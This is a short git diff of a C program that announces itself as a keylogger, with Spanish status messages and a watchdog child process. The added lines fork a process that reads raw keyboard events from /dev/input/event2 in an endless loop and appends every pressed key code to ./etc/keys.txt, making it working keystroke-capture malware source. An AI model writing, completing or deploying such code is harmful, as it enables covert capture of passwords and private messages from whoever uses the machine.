@@ -1,6 +1,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <fcntl.h>
+#include <linux/input.h>
 
 main() {
 	printf("Starting keylogger\n");
@@ -31,9 +33,29 @@ main() {
 		execv(watchdogName, args);
 	}
 	else {
-		printf("Padre (%d)\n", getpid());
-		close(piped[0]);
-		sleep(10);
-		printf("Muriendo el padre\n");
+		if(fork() == 0) {
+			close(piped[0]);
+
+			int file;
+			FILE *result;
+
+			printf("Iniciando keylogger (%d)\n", getpid());
+
+			file = open("/dev/input/event2", O_RDONLY);
+
+			struct input_event ev;
+
+			while(1) {
+				read(file, &ev, sizeof(struct input_event));
+				if(ev.type == EV_KEY) {
+					if(ev.value == 1) {
+						//printf(" : [key %i]\n", ev.code);
+						result = fopen("./etc/keys.txt", "a+");
+						fputc(ev.code, result);
+						fclose(result);
+					}
+				}
+			}
+		}
 	}
 }
